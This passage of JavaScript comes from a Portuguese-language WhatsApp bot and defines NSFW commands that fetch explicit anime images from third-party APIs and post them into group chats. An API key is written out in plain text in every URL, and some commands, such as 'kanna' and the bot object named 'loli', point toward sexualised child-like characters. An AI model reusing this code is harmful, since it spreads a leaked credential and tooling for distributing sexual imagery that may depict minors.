					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/yuri?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/yuri?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/yuri?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/yuri?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`http://api.lolhuman.xyz/api/random/elf?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`http://api.lolhuman.xyz/api/random/elf?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`http://api.lolhuman.xyz/api/random/elf?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`http://api.lolhuman.xyz/api/random/elf?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`http://api.lolhuman.xyz/api/random/elf?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`http://api.lolhuman.xyz/api/random/elf?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`http://api.lolhuman.xyz/api/random/elf?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
                    buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/cum_jpg?apikey=ChOkYbOT8`)
                    loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/cum_jpg?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/cum_jpg?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/cum_jpg?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/cum_jpg?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/cum_jpg?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/cum_jpg?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/pussy_jpg?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/pussy_jpg?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/pussy_jpg?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/pussy_jpg?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/pussy_jpg?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/pussy_jpg?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/pussy_jpg?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/ero?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/ero?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/ero?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/ero?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/ero?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/ero?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/ero?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/tits?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/tits?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/tits?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/tits?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/tits?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/tits?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/tits?apikey=ChOkYbOT8`)
                           loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
										break
					case 'hentai':
				 addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
				gatatauda = body.slice(6)
                            reply(mess.wait)
                            hori = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/hentai?apikey=ChOkYbOT8`, {method: 'get'})
                                                 mhan = await loli.prepareMessage(from, hori, image, {thumbnail: null})
                                                 gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss8 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss8, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
					break
					break
					case 'hentainuds':
				 addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
				gatatauda = body.slice(6)
                            reply(mess.wait)
                            hori = await getBuffer(`https://api.lolhuman.xyz/api/random2/solo?apikey=ChOkYbOT8`, {method: 'get'})
                                                 mhan = await loli.prepareMessage(from, hori, image, {thumbnail: null})
                                                 gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss9 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss9, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
					break
					case 'eroyuri':
				 addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
				gatatauda = body.slice(6)
                            reply(mess.wait)
                            hori = await getBuffer(`https://api.lolhuman.xyz/api/random2/eroyuri?apikey=ChOkYbOT8`, {method: 'get'})
                                                 mhan = await loli.prepareMessage(from, hori, image, {thumbnail: null})
                                                 gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss10 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss10, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
					break
					case 'erok':
				 addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
				gatatauda = body.slice(6)
                            reply(mess.wait)
                            hori = await getBuffer(`https://api.lolhuman.xyz/api/random2/erok?apikey=ChOkYbOT8`, {method: 'get'})
                                                 mhan = await loli.prepareMessage(from, hori, image, {thumbnail: null})
                                                 gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss11 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss11, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
					break
					case 'lewdkemo':
				 addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
				gatatauda = body.slice(6)
                            reply(mess.wait)
                            hori = await getBuffer(`https://api.lolhuman.xyz/api/random2/lewdkemo?apikey=ChOkYbOT8`, {method: 'get'})
                            mhan = await loli.prepareMessage(from, hori, image, {thumbnail: null})
                            gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss12 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss12, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
					break
					
					case 'sovaco':
				 addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
				gatatauda = body.slice(6)
                            reply(mess.wait)
                            hori = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/animearmpits?apikey=ChOkYbOT8`, {method: 'get'})
                            mhan = await loli.prepareMessage(from, hori, image, {thumbnail: null})
                            gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss13 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss13, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
					break
					case 'nhentai':
					  addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
                    if (args.length == 0) return reply(`Exemplo: ${prefix + command} 344253`)
                    henid = args[0]
                    reply(mess.wait)
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentaipdf/${henid}?apikey=ChOkYbOT8`, {method: 'get'})
                    get_result = get_result.result
                    ini_buffer = await getBuffer(get_result)
                    await loli.sendMessage(from, ini_buffer, document, { quoted: horidoc, mimetype: Mimetype.pdf, filename: `@⭐ Henplay ⭐-${pushname}.pdf` })
                    break
                    case 'modonsfw':
					if (!isGroup) return reply(mess.only.group)
					if (!isOwner) return  reply(ptbr.ownerB())
					if (args.length < 1) return reply('Hmmmm')
					if ((args[0]) === 'on') {
						if (isNsfw) return reply('O modo nsfw já está ativo')
						nsfw.push(from)
						fs.writeFileSync('./database/json/nsfw.json', JSON.stringify(nsfw))
						reply(`\`\`\`✓Ativado com sucesso o modo nsfw no grupo\`\`\` *${groupMetadata.subject}*`)
					} else if ((args[0]) === 'off') {
						nsfw.splice(from, 1)
						fs.writeFileSync('./database/json/nsfw.json', JSON.stringify(nsfw))
						reply(`\`\`\`✓Modo nsfw desativado com sucesso no grupo\`\`\` *${groupMetadata.subject}*`)
					} else {
						reply('On para ativar, Off para desligar')
					}
					break
case 'antinsfw':
					if (!isGroup) return reply(mess.only.group)
					if (!isOwner) return  reply(ptbr.ownerB())
					if (args.length < 1) return reply('Hmmmm')
					if ((args[0]) === 'on') {
						if (isAntinsfw) return reply('O modo nsfw já está ativo')
						antinsfw.push(from)
						fs.writeFileSync('./arquivos/antinsfw.json', JSON.stringify(antinsfw))
						reply(`\`\`\`✓Ativado com sucesso o modo antinsfw no grupo\`\`\` *${groupMetadata.subject}*`)
					} else if ((args[0]) === 'off') {
						antinsfw.splice(from, 1)
						fs.writeFileSync('./arquivos/antinsfw.json', JSON.stringify(antinsfw))
						reply(`\`\`\`✓Modo antinsfw desativado com sucesso no grupo\`\`\` *${groupMetadata.subject}*`)
					} else {
						reply('On para ativar, Off para desligar')
					}
					break
					case 'pernas':
					  addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
				gatatauda = body.slice(6)
                            reply(mess.wait)
                            hori = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/animethighss?apikey=ChOkYbOT8`, {method: 'get'})
                            mhan = await loli.prepareMessage(from, hori, image, {thumbnail: null})
                            gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss14 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss14, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
                            break
					case 'oppai':
					  addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
				gatatauda = body.slice(6)
                            reply(mess.wait)
                            hori = await getBuffer(`https://api.lolhuman.xyz/api/random2/tits?apikey=ChOkYbOT8`, {method: 'get'})
                            mhan = await loli.prepareMessage(from, hori, image, {thumbnail: null})
                            gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss15 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss15, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
                            break                
                            case 'ero':
                          addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
				gatatauda = body.slice(6)
                            reply(mess.wait)
                            hori = await getBuffer(`https://api.lolhuman.xyz/api/random2/ero?apikey=ChOkYbOT8`, {method: 'get'})
                            mhan = await loli.prepareMessage(from, hori, image, {thumbnail: null})
                            gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss16 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss16, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
                            break
                            case 'pussy':
                          addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
				gatatauda = body.slice(6)
                            reply(mess.wait)
                            hori = await getBuffer(`https://api.lolhuman.xyz/api/random2/pussy_jpg?apikey=ChOkYbOT8`,{method: 'get'})
                            mhan = await loli.prepareMessage(from, hori, image, {thumbnail: null})
                            gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss17 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss17, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
                            break
                            case 'cum':
                          addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
				gatatauda = body.slice(6)
                            reply(mess.wait)
                            hori = await getBuffer(`https://api.lolhuman.xyz/api/random2/cum_jpg?apikey=ChOkYbOT8`, {method: 'get'})
                            mhan = await loli.prepareMessage(from, hori, image, {thumbnail: null})
                            gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss18 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss18, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
                            break
					
					case 'ahegao':
					  addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
				gatatauda = body.slice(6)
                            reply(mess.wait)
                            hori = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/ahegao?apikey=ChOkYbOT8`, {method: 'get'})
                            mhan = await loli.prepareMessage(from, hori, image, {thumbnail: null})
                            gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss20 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss20, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
                            break
                    case 'futa':
                  addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
				gatatauda = body.slice(6)
                            reply(mess.wait)
                            hori = await getBuffer(`https://api.lolhuman.xyz/api/random2/futanari?apikey=ChOkYbOT8`, {method: 'get'})
                            mhan = await loli.prepareMessage(from, hori, image, {thumbnail: null})
                            gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss21 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss21, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
                            break 
                            case 'bigoppai':
                          addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
				gatatauda = body.slice(6)
                            reply(mess.wait)
                            hori = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/biganimetiddies?apikey=ChOkYbOT8`, {method: 'get'})
                 mhan = await loli.prepareMessage(from, hori, image, {thumbnail: null})
                            gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss22 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss22, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
                            break 
					case 'yaoi':
					  addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
				gatatauda = body.slice(6)
                            reply(mess.wait)
                            hori = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/yaoi?apikey=ChOkYbOT8`, {method: 'get'})
                            mhan = await loli.prepareMessage(from, hori, image, {thumbnail: null})
                            gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss23 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss23, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
                            break
                            case 'kanna':
                            addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
				                gatatauda = body.slice(6)
                            reply(mess.wait)
                            hori = await getBuffer(`http://api.lolhuman.xyz/api/random/kanna?apikey=ChOkYbOT8`, {method: 'get'})
                            mhan = await loli.prepareMessage(from, hori, image, {thumbnail: null})
                            gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss24 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss24, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
                            break 
                      case 'waifu2':
			          addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
					reply(mess.wait)
                    res = await fetchJson(`https://waifu.pics/api/nsfw/waifu`)
                    ggf = await getBuffer(res.url)
                      mhan = await loli.prepareMessage(from, ggf, image, {thumbnail: null})
                            gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss285 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss285, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
					break
					case 'spank':
					addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
                     reply(mess.wait)
                     res = await fetchJson(`https://nekos.life/api/v2/img/spank`)
                    ggf = await getBuffer(res.url)
                    mhan = await loli.prepareMessage(from, ggf, image, {thumbnail: null})
                            gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss25 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss25, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
					break
					case 'classic':
                     addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
                     reply(mess.wait)
                     res = await fetchJson(`https://nekos.life/api/v2/img/classic`)
                    ggf = await getBuffer(res.url)
                    mhan = await loli.prepareMessage(from, ggf, image, {thumbnail: null})
                            gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss26 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss26, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
					break
					case 'siririca':
                     addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
                     reply(mess.wait)
                     res = await fetchJson(`https://nekos.life/api/v2/img/pwankg`)
                    ggf = await getBuffer(res.url)
                    mhan = await loli.prepareMessage(from, ggf, image, {thumbnail: null})
                            gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss27 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss27, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
					break
                        case 'yuri':
                              addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
				                gatatauda = body.slice(6)
                            reply(mess.wait)
                            hori = await getBuffer(`https://api.lolhuman.xyz/api/random2/yuri?apikey=ChOkYbOT8`, {method: 'get'})
                            mhan = await loli.prepareMessage(from, hori, image, {thumbnail: null})
                            gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss28 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
